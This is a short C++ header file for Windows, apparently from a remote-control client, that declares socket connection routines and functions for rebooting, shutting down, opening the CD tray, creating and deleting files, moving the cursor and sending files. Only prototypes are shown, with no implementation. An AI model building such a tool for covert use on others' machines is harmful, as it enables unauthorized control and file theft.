#pragma once
#include <Windows.h>
#include <stdio.h>
#include <conio.h>
#include <tchar.h>
#include <mmsystem.h>
#include <windows.h>
#include <conio.h>
#include <stdio.h>
#include <stdlib.h>
#include<process.h>
#include <iostream>
#include <WinUser.h>

#pragma comment (lib, "ws2_32.lib")
#pragma comment (lib, "mswsock.lib")
#pragma comment (lib,"WinMM.Lib")
using namespace std;
struct Data
{
	char PCName[30], ServerName[30], Massage[200];
	WSADATA WSADat;
	SOCKADDR_IN sin;
	SOCKET Sock,Server;
};
void CreatSocketAndConnect(struct Data *data);
void Menu(struct Data *data);
void CloseConnect(struct Data *data);
void RebootPC();
void ShutDownPC();
void ExitSystemePC();
void ExitFunction();
void OpenCD_ROM();
void CreatFile(char str[],struct Data *data);
void DelFile(char path[],struct Data *data);
void WorkWithCursor(struct Data *data);
void sendFileFunction(char path[],struct Data *data);